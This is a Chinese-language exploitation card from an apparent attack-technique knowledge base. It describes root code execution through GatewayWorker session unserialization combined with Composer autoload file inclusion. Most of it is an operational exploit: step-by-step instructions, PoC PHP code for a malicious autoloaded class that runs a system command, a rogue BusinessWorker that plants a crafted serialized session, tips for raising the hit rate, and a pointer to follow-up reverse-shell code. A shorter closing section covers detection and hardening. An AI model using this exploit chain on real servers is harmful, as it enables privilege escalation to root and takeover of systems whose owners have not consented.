---
id: web-php-deserialization-gatewayworker-session-autoload-file-include-root
title: GatewayWorker session 反序列化 + Composer autoload 文件包含：低权限 worker 触发 root 进程加载恶意类
type: scenario
domain: web
path: web/php/deserialization
technique: gatewayworker-session-unserialize-autoload-lfi
tags:
- php
- workerman
- gatewayworker
- deserialization
- unserialize
- autoload
- composer
- lfi
- privilege-escalation
- root
cve: []
severity: high
confidence: high
status: verified
affected_versions: v3.1.0（原文演示版本，root 复现成功）；v4.0.1 单请求因 v3.1.2 起默认轮询难以触发，需批量连接（原文未展示 v4.0.1 成功截图）
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V228
  verified_at: '2026-11-07T07:06:21+08:00'
  notes: 已对照原文与图01–10核对：Gateway.php CMD_UPDATE_SESSION→Context::sessionDecode直接unserialize、Gateway::setSocketSession/updateSession接口、低权限BusinessWorker注册、Foo.php写入、nc 8282触发、/tmp/success为uid=0(root)均与原文一致。已修正序列化类名长度笔误：GatewayWorker\Foo为17字节（原文举例FooGatewayWorkerFoo为20字节），并将affected_versions按原文改为v3.1.0演示成功、v4.0.1单请求需批量（原文未展示v4.0.1成功截图）。未验证点：未在本机复跑；frontmatter无sources/source_url。
url: /docs/web/php/deserialization/web-php-deserialization-gatewayworker-session-autoload-file-include-root/
draft: false
kb_aliases:
- GatewayWorker 反序列化提权
- Workerman sessionDecode
- CMD_UPDATE_SESSION 反序列化
- Composer autoload 文件包含提权
- GatewayWorker root 提权
---

## 一句话结论

GatewayWorker 的 Gateway 进程在处理 `CMD_UPDATE_SESSION` 时对 worker 传来的 `ext_data` 调用 `Context::sessionDecode()`，后者直接 `unserialize($session_buffer)`；低权限用户只要能写一个可被 Composer autoload 命中的 PHP 文件（如 `vendor/workerman/gateway-worker/src/Foo.php`），再注册一个恶意 BusinessWorker 并在客户端连接时发送 `O:...:"GatewayWorker\Foo":0:{}` 的 session，Gateway 反序列化未知类名触发 autoload 包含该文件，即以 Gateway 进程权限（常为 root）执行任意 PHP 代码。

## 原理

- GatewayWorker 采用 Gateway + BusinessWorker 模型：Gateway 维护客户端连接，BusinessWorker 处理业务。两者通过内部协议通信，worker 可以调用 `Gateway::setSocketSession()`、`Gateway::updateSession()` 等接口修改 Gateway 侧保存的 session。
- `Gateway::onWorkerMessage()` 处理 `CMD_UPDATE_SESSION` 时，先判断 `clientConnections[connection_id]` 是否存在且已有 session，然后：
  - `Context::sessionDecode(clientConnections[connection_id]->session)` 解码旧 session；
  - `Context::sessionDecode($data['ext_data'])` 解码 worker 传来的新数据；
  - `array_replace_recursive()` 合并后 `sessionEncode()` 回写。
- `Context::sessionDecode()` 的实现是 `return unserialize($session_buffer);`，没有任何 `allowed_classes` 限制。`ext_data` 完全由 worker 控制。
- 当序列化字符串包含一个未定义的类名（如 `O:17:"GatewayWorker\Foo":0:{}`）时，PHP 反序列化会触发 Composer 的 autoloader；GatewayWorker 的 PSR-4/autoload 映射会按命名空间查找 `vendor/workerman/gateway-worker/src/Foo.php` 并 `include`。如果攻击者已把该文件写入（低权限 www 用户可写 vendor 目录），文件内的顶层代码就会在 Gateway 进程上下文中执行。
- 因此不需要构造 POP 链，也不需要已有类的魔术方法：`unserialize` 只承担“触发未知类 autoload”的作用，真正的代码在 attacker 写入的类文件里。Gateway 通常由 root 启动（服务/常驻进程），所以最终是 root 代码执行。
- 触发还依赖 worker 注册与负载均衡：攻击者用 `BusinessWorker` 连到 register（默认 `127.0.0.1:1238`，secretKey 默认为空），注册一个恶意 worker；客户端连接由 Gateway 按负载均衡分给 worker，只有分到恶意 worker 时才会发送伪造 session。v3.1.0 默认随机，v3.1.2 起默认轮询，单次连接命中率低，需要批量连接。

## 触发条件

- 目标运行 GatewayWorker/Workerman，Gateway 进程以高权限（常见 root）运行。
- 低权限用户可写 Composer autoload 能覆盖的目录，典型为 `vendor/workerman/gateway-worker/src/`，或项目配置的其他 PSR-4/classmap 目录。
- 攻击者能访问 register 服务（默认 `127.0.0.1:1238` 或内网可达），且 `secretKey` 为空/已知/可绕过。
- 攻击者能运行 PHP 或已有 Workerman 环境来启动恶意 BusinessWorker。
- 有客户端连接进入 Gateway 并被负载均衡到恶意 worker；v3.1.2+ 轮询模式下需要足够多的连接。
- 已加载的现有 PHP 类无法通过改文件生效（CLI 常驻进程不热加载），因此必须走“引入新类”的 autoload 路径。

## 利用步骤

1. 确认目标为 GatewayWorker：查看进程命令行（`WorkerMan: master process ... start.php`）、Gateway 端口（如 8282）、register 地址/端口（默认 1238）与 `secretKey` 配置。
2. 在可写且可被 autoload 的目录写入恶意类文件，例如 `vendor/workerman/gateway-worker/src/Foo.php`：
   ```php
   <?php
   namespace GatewayWorker;
   system("id > /tmp/success");
   class Foo {}
   ```
3. 编写并运行恶意 BusinessWorker（`poc.php`）：设置 `registerAddress`、`secretKey`、`name`、`count`；在 `Events::onConnect($client_id)` 中调用 `Gateway::setSocketSession($client_id, 'O:17:"GatewayWorker\Foo":0:{}')`，再调用 `Gateway::updateSession($client_id, array())` 触发 `CMD_UPDATE_SESSION`。
4. 启动 `php poc.php start`，让恶意 worker 注册进 register；确认 Gateway 侧 worker 列表包含该 worker。
5. 触发客户端连接：TCP Gateway 用 `nc 127.0.0.1 8282`，WebSocket Gateway 用 WS 客户端；连接被分到恶意 worker 后，worker 发送伪造 session，Gateway 反序列化并 autoload 恶意类。
6. 检查 `/tmp/success` 等落地结果，确认执行用户为 root；后续可写入更完整的命令执行/反弹 shell 代码。

## PoC

恶意类文件（写入 `vendor/workerman/gateway-worker/src/Foo.php`）：

```php
<?php
namespace GatewayWorker;
system("id > /tmp/success");
class Foo {}
```

恶意 BusinessWorker 的关键事件（完整启动代码略）：

```php
use GatewayWorker\BusinessWorker;
use GatewayWorker\Lib\Gateway;
use Workerman\Worker;

class Events {
    public static function onConnect($client_id) {
        $evil = 'GatewayWorker\Foo';
        Gateway::setSocketSession($client_id, 'O:' . strlen($evil) . ':"' . $evil . '":0:{}');
        Gateway::updateSession($client_id, array());
    }
}

$worker = new BusinessWorker();
$worker->registerAddress = '127.0.0.1:1238';
$worker->secretKey = '';
$worker->name = 'evil';
$worker->count = 20;
Worker::runAll();
```

批量触发（轮询模式）：启动多个 Workerman `AsyncTcpConnection` 反复连接 `tcp://127.0.0.1:8282`（或 `ws://`），直到请求落到恶意 worker。

## 变体与关联

- 变体：不写 `Foo.php`，改用任意会被 autoload 的路径（项目自定义 PSR-4、classmap、`vendor/composer` 的 autoload 目录）；只要能控制一个 autoload 目标文件即可。
- 变体：若目标使用文件包含/任意类实例化漏洞，也可直接引入新类，不必依赖 session 反序列化；本卡针对的是“只能写文件 + 能注册 worker”的场景。
- 变体：v3.1.2+ 默认轮询，需要批量连接；也可通过观察 Gateway 的 worker 分配规律、增加恶意 worker 进程数提高命中率。
- 关联：[[web-php-deserialization-c-prefix-arrayobject-bypass]]、[[web-php-deserialization-incomplete-class-roundtrip-bypass]]（PHP 反序列化类名/autoload 相关技巧）、[[web-php-file-inclusion]] 目录下的文件包含卡（autoload 本质是文件包含）。
- 边界：vendor 目录不可写则链断；register 不可达或 secretKey 不匹配则无法注册 worker；Gateway 不以 root 运行则只能拿到对应低权限用户；客户端连接未命中恶意 worker 则不触发，需要批量请求。

## 检测与防御

- 检测：`vendor/` 或 autoload 目录出现新增/修改的 PHP 文件，尤其是与已知依赖不符的类文件；GatewayWorker 日志出现未知 worker 注册、`CMD_UPDATE_SESSION` 异常；register 服务出现非预期来源的连接；进程树中出现低权限用户启动的 `WorkerMan: worker process evil`；`/tmp` 等目录出现 `id`/`whoami` 落地文件。
- 检测：Gateway 进程中 `unserialize` 收到包含不存在类名的 session 数据；session 内容长度/格式异常；客户端连接后 Gateway 侧出现文件包含/autoload 行为。
- 防御：Gateway/Workerman 以最小权限用户运行，禁止 root 启动；`secretKey` 设置为强随机值并定期轮换；register 服务只监听 `127.0.0.1` 或严格防火墙限制；vendor 目录只读，部署用户与运行用户分离；开启 `open_basedir`、禁用危险函数；对 Composer autoload 目录做完整性校验与文件监控。
- 加固：升级 GatewayWorker 并检查 session 处理逻辑；对 `unserialize` 使用 `allowed_classes` 白名单（需改框架/业务代码）；限制 worker 注册来源与数量；监控常驻 PHP 进程的子进程与文件写入。
